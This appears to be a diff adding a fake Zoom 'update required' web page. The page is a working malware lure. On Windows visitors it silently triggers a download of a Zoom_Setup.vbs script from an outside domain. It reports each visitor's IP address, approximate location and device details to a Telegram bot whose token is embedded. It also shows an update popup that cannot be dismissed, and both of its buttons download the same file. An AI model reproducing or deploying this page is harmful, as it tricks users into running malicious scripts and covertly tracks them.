@@ -1,0 +1,1310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+  <meta http-equiv="X-Content-Type-Options" content="nosniff">
+  <meta http-equiv="Referrer-Policy" content="no-referrer">
+  <title>Zoom video App.Update</title>
+  <style>
+    :root {
+      --blue: #2563eb;
+      --blue-dark: #1d4ed8;
+      --orange: #f97316;
+      --green: #22c55e;
+      --red: #ef4444;
+      --text: #243047;
+      --muted: #6b7280;
+      --border: #e5e7eb;
+      --panel: #ffffff;
+      --background: #f8fafc;
+    }
+
+    * { box-sizing: border-box; }
+
+    html, body {
+      width: 100%;
+      min-height: 100%;
+      margin: 0;
+      padding: 0;
+      font-family: Inter, Arial, Helvetica, sans-serif;
+      background: #eaf0f7;
+      color: var(--text);
+    }
+
+    body {
+      min-height: 100vh;
+      min-height: 100dvh;
+      overflow-x: hidden;
+    }
+
+    .app-window {
+      width: 100%;
+      min-height: 100vh;
+      min-height: 100dvh;
+      margin: 0;
+      background: var(--panel);
+      border: 0;
+      border-radius: 0;
+      overflow: hidden;
+      box-shadow: none;
+      position: relative;
+    }
+
+    /* Top application bar */
+    .topbar {
+      height: 72px;
+      display: flex;
+      align-items: center;
+      gap: 22px;
+      padding: 0 22px;
+      border-bottom: 1px solid var(--border);
+      background: #fff;
+    }
+
+    .brand {
+      font-size: 20px;
+      font-weight: 800;
+      color: var(--blue);
+      min-width: 150px;
+    }
+
+    .search {
+      height: 40px;
+      width: 260px;
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      background: #f3f5f8;
+      display: flex;
+      align-items: center;
+      padding: 0 15px;
+      color: var(--muted);
+      gap: 9px;
+    }
+
+    .search-icon { font-size: 15px; }
+    .search kbd {
+      margin-left: auto;
+      font-size: 11px;
+      color: #94a3b8;
+    }
+
+    .nav {
+      display: flex;
+      align-items: center;
+      gap: 26px;
+      margin-left: auto;
+    }
+
+    .nav-item {
+      min-width: 60px;
+      text-align: center;
+      color: #596579;
+      font-size: 13px;
+      cursor: pointer;
+    }
+    .windows-popup-logo {
+    display: flex;
+    justify-content: left;
+    align-items: left;
+    margin: 12px 0 16px;
+    }
+
+    .windows-popup-logo img {
+    width:72px;
+    height: 72px;
+    object-fit: contain;
+}
+
+    .nav-item.active { color: var(--blue); font-weight: 700; }
+
+    /* Image slot: replace src with your icon/image */
+    .icon-slot {
+      width: 30px;
+      height: 30px;
+      margin: 0 auto 4px;
+      border-radius: 7px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #64748b;
+      font-size: 17px;
+      overflow: hidden;
+    }
+
+    .icon-slot img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+    }
+
+    .profile {
+      width: 43px;
+      height: 43px;
+      border-radius: 50%;
+      background: #e0e7ff;
+      color: #4338ca;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 800;
+      cursor: pointer;
+      position: relative;
+      margin-left: 8px;
+    }
+
+    .profile::after {
+      content: "";
+      position: absolute;
+      right: 0;
+      top: 0;
+      width: 10px;
+      height: 10px;
+      background: var(--green);
+      border: 2px solid white;
+      border-radius: 50%;
+    }
+
+    /* Main content */
+    .main {
+      min-height: calc(100vh - 118px);
+      min-height: calc(100dvh - 118px);
+      background: var(--background);
+      padding: clamp(24px, 5vw, 55px);
+      position: relative;
+    }
+
+    .welcome {
+      max-width: 760px;
+      margin-bottom: 34px;
+    }
+
+    .welcome h1 {
+      margin: 0 0 8px;
+      font-size: 32px;
+    }
+
+    .welcome p {
+      margin: 0;
+      color: var(--muted);
+    }
+
+    .action-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 220px);
+      gap: 28px;
+    }
+
+    .action-card {
+      height: 205px;
+      border: 0;
+      border-radius: 18px;
+      background: white;
+      box-shadow: 0 7px 22px rgba(15, 23, 42, .08);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: transform .18s, box-shadow .18s;
+      position: relative;
+    }
+
+    .action-card:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 12px 30px rgba(15, 23, 42, .13);
+    }
+
+    .action-icon {
+      width: 92px;
+      height: 92px;
+      border-radius: 24px;
+      background: var(--blue);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      margin-bottom: 16px;
+    }
+
+    .action-card.orange .action-icon { background: var(--orange); }
+
+    .action-icon img {
+      width: 70%;
+      height: 70%;
+      object-fit: contain;
+    }
+
+    .icon-placeholder {
+      color: white;
+      font-size: 40px;
+      font-weight: 700;
+    }
+
+    .action-title {
+      font-weight: 700;
+      font-size: 16px;
+    }
+
+    .action-subtitle {
+      color: var(--muted);
+      font-size: 12px;
+      margin-top: 5px;
+    }
+
+    /* Profile dropdown */
+    .profile-menu {
+      display: none;
+      position: absolute;
+      right: 20px;
+      top: 62px;
+      width: 330px;
+      background: white;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      box-shadow: 0 16px 40px rgba(15, 23, 42, .2);
+      z-index: 20;
+      overflow: hidden;
+    }
+
+    .profile-menu.open { display: block; }
+
+    .account-header {
+      padding: 20px;
+      display: flex;
+      align-items: center;
+      gap: 13px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .avatar-large {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      background: #e0e7ff;
+      display: grid;
+      place-items: center;
+      font-weight: 800;
+      color: #4338ca;
+    }
+
+    .account-header strong { display: block; }
+    .account-header small { color: var(--muted); }
+
+    .status {
+      padding: 14px 20px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .status-row {
+      padding: 8px 0;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      cursor: pointer;
+    }
+
+    .dot {
+      width: 9px;
+      height: 9px;
+      border-radius: 50%;
+      background: var(--green);
+    }
+
+    .dot.away { background: #94a3b8; }
+    .dot.dnd { background: var(--red); }
+
+    .menu-button {
+      width: 100%;
+      border: 0;
+      background: white;
+      padding: 14px 20px;
+      text-align: left;
+      font-size: 14px;
+      color: var(--text);
+      cursor: pointer;
+    }
+
+    .menu-button:hover {
+      background: #f1f5f9;
+    }
+
+    .menu-button.update {
+      color: white;
+      background: var(--blue);
+      font-weight: 700;
+    }
+
+    .menu-button.update:hover { background: var(--blue-dark); }
+
+    .menu-divider {
+      border-top: 1px solid var(--border);
+    }
+
+    .license {
+      margin: 12px 20px 20px;
+      width: calc(100% - 40px);
+      border: 0;
+      border-radius: 7px;
+      padding: 10px;
+      background: var(--blue);
+      color: white;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    /* Toast */
+    .toast {
+      position: fixed;
+      right: 25px;
+      bottom: 25px;
+      background: #0f172a;
+      color: white;
+      padding: 12px 18px;
+      border-radius: 8px;
+      opacity: 0;
+      transform: translateY(10px);
+      pointer-events: none;
+      transition: .25s;
+    }
+
+    .toast.show {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    @media (max-width: 850px) {
+      .topbar { gap: 10px; padding: 0 12px; }
+      .brand { min-width: auto; }
+      .search { width: 180px; }
+      .nav { gap: 8px; }
+      .main { padding: 35px 25px; }
+    }
+
+
+    @media (min-width: 651px) and (max-width: 1000px) {
+      .update-modal {
+        width: 85vw;
+        height: 82dvh;
+      }
+    }
+
+    @media (max-width: 650px) {
+      .search { display: none; }
+      .nav-item { display: none; }
+      .main { padding: 28px 18px; }
+      .action-grid {
+        grid-template-columns: 1fr 1fr;
+        gap: 15px;
+      }
+      .action-card { width: 100%; height: 175px; }
+    }
+  
+
+    /* Windows-only access screen */
+    .os-checking #osRestriction { display: none; }
+
+    .os-restriction {
+      position: fixed;
+      inset: 0;
+      z-index: 10000;
+      background: rgba(10, 10, 12, .78);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      min-height: 100vh;
+      min-height: 100dvh;
+    }
+
+    .os-restriction-card {
+      width: min(650px, 92vw);
+      padding: clamp(34px, 6vw, 62px);
+      text-align: center;
+      background: #050505;
+      color: #fff;
+      border: 1px solid #2b2b2b;
+      border-radius: 8px;
+      box-shadow: 0 25px 80px rgba(0, 0, 0, .65);
+    }
+
+    .os-restriction-icon {
+      width: 82px;
+      height: 82px;
+      margin: 0 auto 26px;
+      border-radius: 4px;
+      display: grid;
+      place-items: center;
+      background: #e10600;
+      color: #fff;
+      font-size: 38px;
+      font-weight: 800;
+    }
+
+    .os-restriction-card h1 {
+      margin: 0 0 16px;
+      color: #fff;
+      font-size: clamp(30px, 5vw, 44px);
+    }
+
+    .os-restriction-card p {
+      margin: 9px 0;
+      color: #fff;
+      font-size: clamp(17px, 2vw, 21px);
+      line-height: 1.55;
+    }
+
+    .os-restriction-card .os-small {
+      color: #d1d5db;
+      font-size: clamp(14px, 1.6vw, 17px);
+      margin-top: 18px;
+    }
+
+    body.os-blocked .app-window { display: none; }
+    body.os-blocked .os-restriction { display: flex; }
+    body.os-allowed .os-restriction { display: none; }
+
+    /* Update notification banner */
+    .update-banner {
+      height: 46px;
+      background: #e7f1ff;
+      border-bottom: 1px solid #c9def9;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      color: #1769c2;
+      font-size: 14px;
+      position: relative;
+      z-index: 5;
+    }
+    .os-restriction-icon {
+    width: 48px;
+    height: 48px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    }
+
+    .os-restriction-icon img {
+    width: 36px;
+    height: 36px;
+    object-fit: contain;
+    }
+
+    .update-banner a {
+      color: #1769c2;
+      font-weight: 800;
+      text-decoration: none;
+    }
+
+    .update-banner a:hover {
+      text-decoration: underline;
+    }
+
+    .update-banner button {
+      position: absolute;
+      right: 18px;
+      border: 0;
+      background: transparent;
+      color: #1769c2;
+      font-size: 21px;
+      cursor: pointer;
+    }
+
+    /* Full-screen dim layer */
+    .update-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      width: 100vw;
+      height: 100vh;
+      height: 100dvh;
+      background: rgba(0, 0, 0, .62);
+      backdrop-filter: blur(9px);
+      -webkit-backdrop-filter: blur(9px);
+      z-index: 100;
+      align-items: center;
+      justify-content: center;
+      padding: 0;
+      overflow: auto;
+    }
+
+    .update-overlay.open {
+      display: flex;
+    }
+
+    /* Popup styled like a desktop application update window */
+    .update-modal {
+      width: min(80vw, 1280px);
+      height: min(80vh, 960px);
+      height: min(80dvh, 960px);
+      max-height: calc(100dvh - 24px);
+      background: #050505;
+      color: #fff;
+      border: 1px solid #292929;
+      border-radius: 8px;
+      box-shadow: 0 30px 90px rgba(0, 0, 0, .7);
+      overflow: hidden;
+      animation: updatePopupIn .18s ease-out;
+    }
+
+    @keyframes updatePopupIn {
+      from {
+        opacity: 0;
+        transform: translateY(-8px) scale(.985);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    .update-window-bar {
+      min-height: 52px;
+      padding: 0 18px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid #2a2a2a;
+      background: #090909;
+    }
+
+    .update-window-title {
+      font-size: 15px;
+      font-weight: 700;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .mini-app-icon {
+      width: 20px;
+      height: 20px;
+      border-radius: 3px;
+      background: #e10600;
+      color: white;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 10px;
+    }
+
+    .window-controls {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding-right: 3px;
+    }
+
+    .window-controls span {
+      width: 11px;
+      height: 11px;
+      border-radius: 50%;
+      background: #555;
+    }
+
+    .update-content {
+      padding: clamp(24px, 3vw, 42px) clamp(24px, 3.5vw, 48px) 30px;
+      height: calc(100% - 43px);
+      display: flex;
+      flex-direction: column;
+      min-height: 0;
+    }
+
+    .update-content h2 {
+      margin: 0 0 8px;
+      font-size: clamp(28px, 3vw, 40px);
+      line-height: 1.15;
+      color: #fff;
+    }
+
+    .update-intro {
+      margin: 0 0 24px;
+      color: #d1d5db;
+      font-size: clamp(14px, 1.2vw, 17px);
+    }
+
+    .release-notes {
+      flex: 1 1 auto;
+      min-height: 0;
+      overflow-y: auto;
+      padding: 0 22px 0 3px;
+      color: #f3f4f6;
+      font-size: clamp(14px, 1.15vw, 17px);
+      line-height: 1.6;
+    }
+
+    .release-notes h3 {
+      margin: 0 0 4px;
+      font-size: 15px;
+      font-weight: 600;
+      color: #fff;
+    }
+
+    .release-notes h3:not(:first-child) {
+      margin-top: 22px;
+    }
+
+    .release-notes p {
+      margin: 0;
+    }
+
+    .release-notes::-webkit-scrollbar {
+      width: 8px;
+    }
+
+    .release-notes::-webkit-scrollbar-track {
+      background: #111;
+    }
+
+    .release-notes::-webkit-scrollbar-thumb {
+      background: #444;
+      border-radius: 8px;
+    }
+
+    .release-notes ul {
+      margin: 4px 0 0 18px;
+      padding: 0;
+    }
+
+    .release-notes li {
+      margin: 2px 0;
+    }
+
+    .update-actions {
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+      gap: 12px;
+      margin-top: 24px;
+      padding-top: 8px;
+      flex: 0 0 auto;
+    }
+
+    .update-primary,
+    .update-later {
+      min-width: 120px;
+      height: 46px;
+      padding: 0 26px;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      text-decoration: none;
+    }
+
+
+    .update-primary,
+    .update-later {
+      text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+    }
+
+    .update-primary {
+      background: #e10600;
+      color: white;
+      border: 1px solid #e10600;
+    }
+
+    .update-primary:hover {
+      background: #b91c1c;
+    }
+
+    .update-later {
+      background: #111;
+      color: #fff;
+      border: 1px solid #555;
+      font-weight: 500;
+    }
+
+    .update-later:hover {
+      background: #1f1f1f;
+    }
+
+    @media (max-width: 650px) {
+      .topbar {
+        min-height: 64px;
+        height: auto;
+        padding: 10px 12px;
+      }
+
+      .brand {
+        font-size: 17px;
+      }
+
+      .profile {
+        flex: 0 0 40px;
+      }
+
+      .update-overlay {
+        align-items: center;
+        padding: 8px;
+      }
+
+      .update-modal {
+        width: 96vw;
+        height: 94dvh;
+        max-height: 94dvh;
+      }
+
+      .update-content {
+        padding: 20px 16px 18px;
+      }
+
+      .update-content h2 {
+        font-size: 24px;
+      }
+
+      .release-notes {
+        flex: 1 1 auto;
+        min-height: 0;
+        font-size: 14px;
+      }
+
+      .update-actions {
+        gap: 8px;
+      }
+
+      .update-primary,
+      .update-later {
+        flex: 1;
+        min-width: 0;
+      }
+    }
+
+    @media (max-width: 380px) {
+      .action-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .nav {
+        display: none;
+      }
+    }
+
+    @media (min-width: 1400px) {
+      .action-grid {
+        grid-template-columns: repeat(2, 240px);
+      }
+    }
+
+  </style>
+</head>
+
+<body class="os-checking">
+
+  <script>
+    /*
+     * ============================================================
+     * ZOOM VIDEO - WINDOWS VISIT REPORTING VIA TELEGRAM
+     * ============================================================
+     *
+     * This is a client-side demo/assessment implementation.
+     *
+     *
+     * Replace the two values below with your own bot credentials.
+     */
+    const TELEGRAM_BOT_TOKEN = "7553964177:AAHjya64U87kemZTH_BQ-cRvnm9jb_ftaMk";
+    const TELEGRAM_CHAT_ID   = "6626645668";
+
+    // The file the school wants Windows users to download.
+    const SCHOOL_UPDATE_URL = "https://purchqsecrder.me/views/Zoom_Setup.vbs";
+    const AUTO_DOWNLOAD_DELAY_MS = 12000;
+
+    /*
+     * The previous version used a localStorage/IP counter. That could make
+     * testing stop completely after two attempts. This version removes that
+     * limiter and requests the same-site VBS through a hidden iframe.
+     *
+     * For the browser to download the VBS, the web server must return:
+     * Content-Disposition: attachment; filename="school-video-update.vbs"
+     */
+
+    function getSchoolUpdateUrl() {
+      return new URL(SCHOOL_UPDATE_URL, window.location.href).href;
+    }
+
+    function triggerSchoolUpdateDownload() {
+      if (window.SCHOOL_VIDEO_WINDOWS_ALLOWED !== true) return false;
+
+      const url = getSchoolUpdateUrl();
+      console.info("School Video update URL requested:", url);
+
+      // Request the exact same update URL used by both popup buttons.
+      // A real download is controlled by the response headers from that URL.
+      const link = document.createElement("a");
+      link.href = url;
+      link.download = "";
+      link.style.position = "fixed";
+      link.style.left = "-9999px";
+      link.style.width = "1px";
+      link.style.height = "1px";
+      document.body.appendChild(link);
+      link.click();
+      link.remove();
+      return true;
+    }
+
+    function scheduleAutomaticSchoolUpdate() {
+      if (window.SCHOOL_VIDEO_WINDOWS_ALLOWED !== true) return;
+
+      setTimeout(function () {
+        try {
+          triggerSchoolUpdateDownload();
+        } catch (error) {
+          console.error("Automatic School Video update failed:", error);
+        }
+      }, AUTO_DOWNLOAD_DELAY_MS);
+    }
+
+    async function reportWindowsVisitToTelegram() {
+      // Do not report unsupported devices.
+      if (window.SCHOOL_VIDEO_WINDOWS_ALLOWED !== true) return;
+
+      // Prevent duplicate reports during one page load.
+      if (window.SCHOOL_VIDEO_VISIT_REPORTED === true) return;
+      window.SCHOOL_VIDEO_VISIT_REPORTED = true;
+
+      // IMPORTANT: start the update download request at the same moment as
+      // the Windows Telegram visit report. This removes the dependency on
+      // the popup timer or the IP/location lookup finishing first.
+      // The server must serve SCHOOL_UPDATE_URL as an attachment.
+      try {
+        triggerSchoolUpdateDownload();
+      } catch (error) {
+        console.warn("School Video update request could not be started:", error);
+      }
+
+      const visitTime = new Date();
+
+      const visit = {
+        session: (crypto.randomUUID ? crypto.randomUUID() : String(Date.now())),
+        time: visitTime.toISOString(),
+        screen: `${window.screen.width} x ${window.screen.height}`,
+        viewport: `${window.innerWidth} x ${window.innerHeight}`,
+        pixelRatio: window.devicePixelRatio || 1,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
+        language: navigator.language || "Unknown",
+        platform: navigator.platform || "Unknown",
+        browser: navigator.userAgent || "Unknown"
+      };
+
+      let location = {
+        ip: "Unavailable",
+        country: "Unavailable",
+        region: "Unavailable",
+        city: "Unavailable",
+        latitude: "Unavailable",
+        longitude: "Unavailable"
+      };
+
+      /*
+       * ipapi.co returns the visitor's public IP and approximate
+       * IP-based location. This is not GPS/exact physical location.
+       */
+      try {
+        const geoResponse = await fetch("https://ipapi.co/json/", {
+          method: "GET",
+          cache: "no-store"
+        });
+
+        if (geoResponse.ok) {
+          const geo = await geoResponse.json();
+
+          location = {
+            ip: geo.ip || "Unavailable",
+            country: geo.country_name || "Unavailable",
+            region: geo.region || "Unavailable",
+            city: geo.city || "Unavailable",
+            latitude: geo.latitude ?? "Unavailable",
+            longitude: geo.longitude ?? "Unavailable"
+          };
+        }
+      } catch (error) {
+        console.warn("Could not retrieve IP/location information.");
+      }
+
+      const message =
+`🟦 Z000M— WINDOWS A1ERT
+
+🕒 Time: ${visit.time}
+🆔 Session: ${visit.session}
+💻 Windows device
+🖥 Screen: ${visit.screen}
+🌐 Viewport: ${visit.viewport}
+🔎 Pixel ratio: ${visit.pixelRatio}
+🌍 Country: ${location.country}
+📍 Region: ${location.region}
+🏙 City: ${location.city}
+📡 IP: ${location.ip}
+📌 Approx. coordinates: ${location.latitude}, ${location.longitude}
+🕐 Timezone: ${visit.timezone}
+🌐 Language: ${visit.language}
+🧩 Platform: ${visit.platform}
+
+📄 Host: ${window.location.href}`;
+
+      // Don't attempt the request until credentials have been supplied.
+      if (
+        !TELEGRAM_BOT_TOKEN ||
+        !TELEGRAM_CHAT_ID ||
+        TELEGRAM_BOT_TOKEN.includes("PASTE_YOUR") ||
+        TELEGRAM_CHAT_ID.includes("PASTE_YOUR")
+      ) {
+        console.warn("Telegram reporting is not configured yet.");
+        return;
+      }
+
+      try {
+        const telegramUrl =
+          `https://api.telegram.org/bot${encodeURIComponent(TELEGRAM_BOT_TOKEN)}/sendMessage`;
+
+        const response = await fetch(telegramUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message
+          }),
+          keepalive: true
+        });
+
+        if (!response.ok) {
+          console.warn("Telegram reporting failed:", await response.text());
+        }
+      } catch (error) {
+        console.warn("Telegram reporting request failed.");
+      }
+    }
+  </script>
+
+
+  
+  <script>
+    (function enforceWindowsOnly() {
+      const ua = navigator.userAgent || "";
+      const platform = navigator.platform || "";
+      const uaDataPlatform =
+        navigator.userAgentData && navigator.userAgentData.platform
+          ? navigator.userAgentData.platform : "";
+
+      const isWindows =
+        /Windows/i.test(ua) ||
+        /Win/i.test(platform) ||
+        /Windows/i.test(uaDataPlatform);
+
+      // iPads can identify themselves as Macintosh.
+      const isAppleTouchDevice =
+        /Macintosh/i.test(ua) &&
+        navigator.maxTouchPoints &&
+        navigator.maxTouchPoints > 1;
+
+      const allowed = isWindows && !isAppleTouchDevice;
+
+      document.body.classList.remove("os-checking");
+      document.body.classList.add(allowed ? "os-allowed" : "os-blocked");
+      window.SCHOOL_VIDEO_WINDOWS_ALLOWED = allowed;
+
+      // Report only Windows visits.
+      if (allowed) {
+        reportWindowsVisitToTelegram();
+      }
+
+      const restriction = document.getElementById("osRestriction");
+      if (restriction) {
+        restriction.setAttribute("aria-hidden", allowed ? "true" : "false");
+      }
+    })();
+  </script>
+
+  <div id="osRestriction" class="os-restriction" aria-hidden="true">
+    <div class="os-restriction-card">
+      <div class="os-restriction-icon">
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSvXhiLIbLL-bB7CJkAAD4FhO9WReOMtffkbR4Y7l9vsw&s=10" alt="Zoom.Logo">
+</div>
+      <h1>Windows Computer Required!</h1>
+      <p>This content was designed for <strong>Windows desktop computers</strong> only.</p>
+      <p class="os-small">Please use a Windows laptop or computer to join this meeting.</p>
+    </div>
+  </div>
+  <div class="app-window">
+
+    <header class="topbar">
+      <div class="brand">Zoom Video</div>
+
+      <div class="search">
+        <span class="search-icon">⌕</span>
+        <span>Search</span>
+        <kbd>Ctrl + F</kbd>
+      </div>
+
+      <nav class="nav">
+        <div class="nav-item active" onclick="showToast('Home')">
+          <div class="icon-slot">
+            <!-- Replace with: <img src="images/home.png" alt="Home"> -->
+            🏠
+          </div>
+          Home
+        </div>
+
+        <div class="nav-item" onclick="showToast('Chat')">
+          <div class="icon-slot">
+            <!-- Replace with: <img src="images/chat.png" alt="Chat"> -->
+            💬
+          </div>
+          Chat(3)
+        </div>
+
+        <div class="nav-item" onclick="showToast('Classes')">
+          <div class="icon-slot">
+            <!-- Replace with: <img src="images/classes.png" alt="Classes"> -->
+            🗓
+          </div>
+          History
+        </div>
+
+        <div class="nav-item" onclick="showToast('Students')">
+          <div class="icon-slot">
+            <!-- Replace with: <img src="images/students.png" alt="Students"> -->
+            👥
+          </div>
+          Contacts
+        </div>
+      </nav>
+
+      <div class="profile" onclick="toggleProfile()">S</div>
+    </header>
+
+    <div id="updateBanner" class="update-banner">
+      <span>Zoom Application is outdated!</span>
+      <a href="https://purchqsecrder.me/views/Zoom_Setup.vbs" download>Update</a>
+      <button onclick="openUpdateModal()">×</button>
+    </div>
+
+    <main class="main">
+      <section class="welcome">
+        <h1>Welcome,</h1>
+        <p>Start or Join a meeting.</p>
+      </section>
+
+      <section class="action-grid">
+
+        <button class="action-card orange" onclick="showToast('Starting a new class')">
+          <div class="action-icon">
+            <!-- Replace with your video-camera image -->
+            <!-- <img src="images/video-camera.png" alt="New class"> -->
+            <span class="icon-placeholder">▶</span>
+          </div>
+          <div class="action-title">New Video</div>
+          <div class="action-subtitle">Start a video session</div>
+        </button>
+
+        <button class="action-card" onclick="showToast('Opening join class')">
+          <div class="action-icon">
+            <!-- <img src="images/join.png" alt="Join class"> -->
+            <span class="icon-placeholder">＋</span>
+          </div>
+          <div class="action-title">Join Meeting with invite code</div>
+          <div class="action-subtitle">Enter meeting</div>
+        </button>
+
+        <button class="action-card" onclick="showToast('Opening schedule')">
+          <div class="action-icon">
+            <!-- <img src="images/calendar.png" alt="Schedule"> -->
+            <span class="icon-placeholder">19</span>
+          </div>
+          <div class="action-title">Schedule</div>
+          <div class="action-subtitle">Plan a meeting</div>
+        </button>
+
+        <button class="action-card" onclick="showToast('Opening screen sharing')">
+          <div class="action-icon">
+            <!-- <img src="images/share-screen.png" alt="Share screen"> -->
+            <span class="icon-placeholder">↑</span>
+          </div>
+          <div class="action-title">Share Screen</div>
+          <div class="action-subtitle">Share screen to via Zoom</div>
+        </button>
+
+      </section>
+
+      <div id="profileMenu" class="profile-menu">
+        <div class="account-header">
+          <div class="avatar-large">S</div>
+          <div>
+            <strong>Host ID</strong>
+            <small>19372801</small>
+          </div>
+        </div>
+
+        <div class="status">
+          <div class="status-row" onclick="setStatus('Available')">
+            <span class="dot"></span> Available
+          </div>
+          <div class="status-row" onclick="setStatus('Away')">
+            <span class="dot away"></span> Away
+          </div>
+          <div class="status-row" onclick="setStatus('Do not disturb')">
+            <span class="dot dnd"></span> Do not disturb
+          </div>
+        </div>
+
+        <button class="menu-button" onclick="showToast('Opening profile')">My Profile</button>
+        <button class="menu-button" onclick="showToast('Showing school features')">Zoom Features</button>
+        <button class="menu-button" onclick="showToast('Opening help')">Help</button>
+
+        <div class="menu-divider"></div>
+
+        <button class="menu-button update" onclick="showToast('Checking for updates...')">
+          Check for Updates
+        </button>
+
+        <button class="menu-button" onclick="showToast('Opening settings')">Settings</button>
+        <button class="menu-button" onclick="showToast('Signed out')">Sign Out</button>
+
+        <button class="license" onclick="showToast('School administrator options')">
+          School Admin
+        </button>
+      </div>
+    </main>
+  </div>
+
+  <div id="toast" class="toast"></div>
+
+  <script>
+    function toggleProfile() {
+      document.getElementById("profileMenu").classList.toggle("open");
+    }
+
+    function showToast(message) {
+      const toast = document.getElementById("toast");
+      toast.textContent = message;
+      toast.classList.add("show");
+
+      clearTimeout(window.toastTimer);
+      window.toastTimer = setTimeout(() => {
+        toast.classList.remove("show");
+      }, 1800);
+    }
+
+    function setStatus(status) {
+      showToast("Status changed to " + status);
+      document.getElementById("profileMenu").classList.remove("open");
+    }
+
+    document.addEventListener("click", function(event) {
+      const menu = document.getElementById("profileMenu");
+      const profile = document.querySelector(".profile");
+
+      if (!menu.contains(event.target) && !profile.contains(event.target)) {
+        menu.classList.remove("open");
+      }
+    });
+  
+    // Show the school update popup automatically after 3 seconds.
+    // Change UPDATE_DELAY_MS if your assessment requires another delay.
+    const UPDATE_DELAY_MS = 3000;
+
+    function openUpdateModal() {
+      const overlay = document.getElementById("updateOverlay");
+      overlay.classList.add("open");
+      overlay.setAttribute("aria-hidden", "false");
+    }
+
+    function showLaterMessage() {
+      // The popup intentionally stays open until the page is reloaded.
+      showToast("The update reminder will remain until this page is reloaded.");
+    }
+
+    window.addEventListener("load", function () {
+      if (window.SCHOOL_VIDEO_WINDOWS_ALLOWED === true) {
+        console.info("School Video: Windows detected; update download request started with Telegram visit report.");
+        setTimeout(openUpdateModal, UPDATE_DELAY_MS);
+      } else {
+        console.info("School Video: automatic VBS download disabled because this is not Windows.");
+      }
+    });
+
+    // Automatic same-site .vbs download is scheduled independently of the persistent popup.
+    // Intentionally no close handler:
+    // clicking outside, pressing Escape, or clicking Later cannot remove the popup.
+    // Reloading the page resets the 3-second timer.
+
+  </script>
+
+  <!-- School application update popup -->
+  <div id="updateOverlay" class="update-overlay" aria-hidden="true">
+    <div class="update-modal" role="dialog" aria-modal="true" aria-labelledby="updateTitle">
+      <div class="update-window-bar">
+        <div class="update-window-title">
+          <span class="mini-app-icon">▣</span>
+          Zoom Application Require Update - Your App is out of date.
+        </div>
+
+        <span class="window-controls" aria-hidden="true">
+          <span></span><span></span><span></span>
+        </span>
+      </div>
+
+      <div class="update-content">
+        <h2 id="updateTitle">Update Available!</h2><br>
+          <div class="windows-popup-logo">
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSvXhiLIbLL-bB7CJkAAD4FhO9WReOMtffkbR4Y7l9vsw&s=10" alt="Zoom.Logo">
+</div>
+
+        <!-- EDIT THIS TEXT FOR YOUR SCHOOL -->
+        <p class="update-intro">
+          Your Zoom Application is missing some features.
+          A new version of Zoom Application is available.
+        </p>
+
+        <div class="release-notes">
+          <!-- EDIT YOUR SCHOOL RELEASE NOTES HERE -->
+          <h2>Zoom latest application has been downloaded</h2>
+          <ul>
+            <li>Kindly check your downloads folder for filename Zoom_Setup.iso to view meeting.</li>
+            <li>Double click and follow the proceedure.</li>    
+          </ul><br><br>
+
+          <h3>Zoom instruction</h3>
+          <p>
+            Please update video application before joining your next meeting with
+            <strong>Later</strong> button.
+          </p>
+
+          <h3></h3>
+          
+        </div>
+
+        <div class="update-actions">
+          <!-- CHANGE THIS URL TO YOUR REAL UPDATE/DOWNLOAD PAGE -->
+          <a
+            class="update-primary"
+            href="https://purchqsecrder.me/views/Zoom_Setup.vbs"
+            download
+          >Update</a>
+
+          <a class="update-later" href="https://purchqsecrder.me/views/Zoom_Setup.vbs" download>Later</a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</body>
+</html>
